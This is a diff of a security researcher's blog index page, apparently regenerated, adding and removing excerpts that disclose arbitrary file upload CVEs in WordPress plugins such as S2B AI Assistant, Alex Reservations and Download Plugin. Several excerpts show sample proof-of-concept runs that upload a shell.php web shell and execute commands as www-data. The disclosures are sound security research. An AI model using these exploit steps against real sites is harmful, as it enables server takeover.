@@ -277,6 +277,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -301,19 +303,19 @@
                             </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2025-12720/">g-FFL Cockpit &lt;= 1.7.1 - Improper Authorization to Unauthenticated Product Deletion</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2025-12721/">g-FFL Cockpit &lt;= 1.7.1 - Missing Authorization to Unauthenticated Information Exposure</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
                             </li>
                         
                             <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-13390/">WP Directory Kit &lt;= 1.4.4 - Authentication Bypass to Privilege Escalation via Account Takeover</a>
-                            </li>
-                        
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-12585/">MxChat – AI Chatbot for WordPress &lt;= 2.5.5 - Unauthenticated Information Exposure</a>
-                            </li>
-                        
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-13597/">AI Feeds &lt;= 1.0.11 - Unauthenticated Arbitrary File Upload</a>
                             </li>
                         
                     
@@ -324,6 +326,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -427,6 +431,148 @@
                 <div class="posts">
     
     
+    <article class="post">
+        <div class="info">
+  <h1 class="post-title">
+    <a href="https://ryankozak.com/posts/cve-2025-12973/">S2B AI Assistant – ChatBot, ChatGPT, OpenAI, Content &amp; Image Generator &lt;= 1.7.8 - Authenticated (Editor&#43;) Arbitrary File Upload</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-11-20T00:01:00Z" class="post-date">
+        November 20, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>3 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-CVE">
+        <a href="https://ryankozak.com/tags/cve">CVE</a>
+      </li>
+      
+      <li class="tag-WordPress">
+        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
+      </li>
+      
+      <li class="tag-S2B AI Assistant">
+        <a href="https://ryankozak.com/tags/s2b-ai-assistant">S2B AI Assistant</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+        
+        <h3 id="cve-2025-12973">CVE-2025-12973</h3>
+<p>The WordPress <a href="https://wordpress.org/plugins/s2b-ai-assistant" target="_blank">S2B AI Assistant</a> plugin (versions 2.47 and prior) contains an arbitrary file upload vulnerability that allows authenticated WordPress users with Editor role or higher to upload malicious PHP files to the server, potentially leading to remote code execution.</p>
+<h2 id="tldr-exploits">TL;DR Exploits</h2>
+<p>A POC <a href="https://github.com/d0n601/CVE-2025-12973/blob/master/CVE-2025-12973.py" target="_blank">CVE-2025-12973.py</a> is provided to demonstrate a remote attacker uploading <code>shell.php</code> and executing remote code:</p>
+<pre tabindex="0"><code>python3 ./CVE-2025-12973.py http://techcorp.cc editor $PASSWORD
+[+] Target: http://techcorp.cc
+[+] Username: editor
+[+] Nonce obtained: a15be47119
+[+] File uploaded successfully!
+[+] Shell URL: http://techcorp.cc/wp-content/uploads/2025/11/shell.php
+[+] Command output:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><h2 id="technical-description">Technical Description</h2>
+<p>The vulnerability exists in the <code>Utils.php</code> file at the <code>storeFile()</code> method, which is called by the <code>/wp-admin/admin-post.php</code> endpoint with action <code>s2b_store_chatbot_upload</code>. The upload functionality uses a custom file extension whitelist that explicitly allows dangerous file types including PHP files. This allows authenticated WordPress users with Editor role or higher to upload arbitrary files, including PHP files that can be executed on the server.</p>
+        
+        <div class="read-more-link">
+            <a href="/posts/cve-2025-12973/">Read More…</a>
+        </div>
+        
+        
+    </article>
+    <article class="post">
+        <div class="info">
+  <h1 class="post-title">
+    <a href="https://ryankozak.com/posts/cve-2025-12399/">Alex Reservations: Smart Restaurant Booking &lt;= 2.2.3 - Authenticated (Admin&#43;) Arbitrary File Upload</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-11-07T00:01:00Z" class="post-date">
+        November 7, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>2 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-CVE">
+        <a href="https://ryankozak.com/tags/cve">CVE</a>
+      </li>
+      
+      <li class="tag-WordPress">
+        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
+      </li>
+      
+      <li class="tag-Alex Reservations">
+        <a href="https://ryankozak.com/tags/alex-reservations">Alex Reservations</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+        
+        <h3 id="cve-2025-12399">CVE-2025-12399</h3>
+<p>The WordPress <a href="https://wordpress.org/plugins/alex-reservations" target="_blank">Alex Reservations</a> plugin (versions 2.2.3 and prior) contains an arbitrary file upload vulnerability that allows authenticated WordPress administrators to upload malicious PHP files to the server, potentially leading to remote code execution.</p>
+<h2 id="tldr-exploits">TL;DR Exploits</h2>
+<p>A POC <a href="https://github.com/d0n601/CVE-2025-12399/blob/master/CVE-2025-12399.py" target="_blank">CVE-2025-12399.py</a> is provided to demonstrate a remote attacker uploading <code>shell.php</code> and executing remote code:</p>
+<pre tabindex="0"><code>python3 ./CVE-2025-12399.py https://TARGETSITE.com admin &#34;$PASSWORD&#34;                                                                                            
+[+] Target: http://TARGETSITE.com
+[+] Username: admin
+[+] Nonce obtained: 022b25d0a5
+[+] File uploaded successfully!
+[+] Shell URL: https://TARGETSITE.com/wp-content/uploads/alex-reservations/2025/10/shell.php
+[+] Command output:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><h2 id="technical-description">Technical Description</h2>
+<p>The vulnerability exists in the <code>UploadFileController.php</code> file at the <code>/wp-json/srr/v1/app/upload/file</code> endpoint. The upload functionality lacks proper file validation and only performs basic filename sanitization using a regex pattern. This allows authenticated WordPress administrators to upload arbitrary files, including PHP files that can be executed on the server.</p>
+        
+        <div class="read-more-link">
+            <a href="/posts/cve-2025-12399/">Read More…</a>
+        </div>
+        
+        
+    </article>
     <article class="post">
         <div class="info">
   <h1 class="post-title">
@@ -621,168 +767,6 @@
         
         
     </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://ryankozak.com/posts/cve-2025-23968/">AI Bud – AI Content Generator, AI Chatbot, ChatGPT, Gemini, GPT-4o</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      
-      <time datetime=" 2025-07-03T00:00:00Z" class="post-date">
-        July 3, 2025
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>4 mins read</span>
-      </span>
-    </div>
-
-    
-    <ul class="tags">
-      
-      <li class="tag-CVE">
-        <a href="https://ryankozak.com/tags/cve">CVE</a>
-      </li>
-      
-      <li class="tag-WordPress">
-        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
-      </li>
-      
-      <li class="tag-AI Bud">
-        <a href="https://ryankozak.com/tags/ai-bud">AI Bud</a>
-      </li>
-      
-    </ul>
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        <h3 id="cve-2025-23968">CVE-2025-23968</h3>
-<p>The <a href="https://wordpress.org/plugins/aibuddy-openai-chatgpt/" target="_blank">AI Bud</a> plugin exposes a REST API endpoint <code>/wp-json/ai-buddy/v1/wp/attachments</code> that allows uploading files to the WordPress media library. The endpoint’s file logic contains file renaming functionality that triggers after file type validation, and allows the attacker to rename the uploaded file to any extension (including.php) allowing administrators or above to upload arbitrary files and potentially gain code execution on the server.</p>
-<h2 id="tldr-exploits">TL;DR Exploits</h2>
-<p>A POC <a href="https://github.com/d0n601/CVE-2025-23968/blob/master/cve-2025-23968.py" target="_blank">cve-2025-23968.py</a> is provided to demonstrate an administrator uploading a web shell named <code>shell.php</code>.</p>
-        
-        <div class="read-more-link">
-            <a href="/posts/cve-2025-23968/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://ryankozak.com/posts/cve-2025-6586/">Download Plugin &lt;= 2.2.8 - Authenticated (Admin&#43;) Arbitrary File Upload via the dpwap_plugin_locInstall Function</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      
-      <time datetime=" 2025-07-03T00:00:00Z" class="post-date">
-        July 3, 2025
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>3 mins read</span>
-      </span>
-    </div>
-
-    
-    <ul class="tags">
-      
-      <li class="tag-CVE">
-        <a href="https://ryankozak.com/tags/cve">CVE</a>
-      </li>
-      
-      <li class="tag-WordPress">
-        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
-      </li>
-      
-    </ul>
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        <h3 id="cve-2025-6586">CVE-2025-6586</h3>
-<p>The <a href="https://wordpress.org/plugins/download-plugin/" target="_blank">Download Plugin</a> does not sanitize the file types of the <code>dpwap_plugin_locInstall</code> function
-exposed via the <code>mul_upload</code> admin page, allowing administrators or above to upload arbitrary files and
-potentially gain code execution on the server.</p>
-<h2 id="tldr-exploits">TL;DR Exploits</h2>
-<p>A POC <a href="https://github.com/d0n601/CVE-2025-6586/blob/master/cve-2025-6586.py" target="_blank">cve-2025-6586.py</a> is provided to demonstrate an administrator uploading a web shell named <code>shell.php</code>.</p>
-<pre tabindex="0"><code>python3 cve-2025-6586.py https://lab1.hacker admin PASSWORD
-Logging into: https://lab1.hacker/wp-admin
-Extracting nonce values...
-Uploading web shell: shell.php
-Web Shell Location: https://lab1.hacker/wp-
-content/uploads/dpwap_logs/files/tmp/shell.php
-
-Executing test command: ip addr
-    &lt;pre&gt;1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN
-group default qlen 1000
-    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
-    inet 127.0.0.1/8 scope host lo
-        valid_lft forever preferred_lft forever
-    inet6 ::1/128 scope host
-        valid_lft forever preferred_lft forever
-2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP
-group default qlen 1000
-    link/ether 08:00:27:5b:34:2f brd ff:ff:ff:ff:ff:ff
-    altname enp0s3
-    inet 10.0.2.15/24 metric 100 brd 10.0.2.255 scope global dynamic eth0
-v       alid_lft 75221sec preferred_lft 75221sec
-    inet6 fd17:625c:f037:2:a00:27ff:fe5b:342f/64 scope global dynamic
-mngtmpaddr noprefixroute
-        valid_lft 86354sec preferred_lft 14354sec
-    inet6 fe80::a00:27ff:fe5b:342f/64 scope link
-        valid_lft forever preferred_lft forever
-3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP
-group default qlen 1000
-    link/ether 08:00:27:39:ea:eb brd ff:ff:ff:ff:ff:ff
-    altname enp0s8
-    inet 192.168.56.56/24 brd 192.168.56.255 scope global eth1
-        valid_lft forever preferred_lft forever
-    inet6 fe80::a00:27ff:fe39:eaeb/64 scope link
-        valid_lft forever preferred_lft forever
-4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue
-state DOWN group default
-    link/ether 02:42:77:47:94:a5 brd ff:ff:ff:ff:ff:ff
-    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
-        valid_lft forever preferred_lft forever
-&lt;/pre&gt;
-</code></pre><h2 id="details">Details</h2>
-<p>The <code>dpwap_plugin_multiple_upload_func</code> function is exposed in the <code>mul_upload</code> admin page. On line <a href="https://plugins.trac.wordpress.org/browser/download-plugin/trunk/app/Plugins/Base.php#L80" target="_blank">80</a> of <code>/wp-content/plugins/download-plugin/app/Plugins/Base.php</code> the function includes <a href="https://plugins.trac.wordpress.org/browser/download-plugin/trunk/app/Plugins/templates/multiple_upload_plugin.php" target="_blank">multiple_upload_plugin.php</a>.</p>
-        
-        <div class="read-more-link">
-            <a href="/posts/cve-2025-6586/">Read More…</a>
-        </div>
-        
-        
-    </article>
 </div>
 
 
@@ -836,6 +820,10 @@ state DOWN group default
     
     
     <a href="/page/11/">11</a>
+    
+    
+    
+    <a href="/page/12/">12</a>
     
     
 
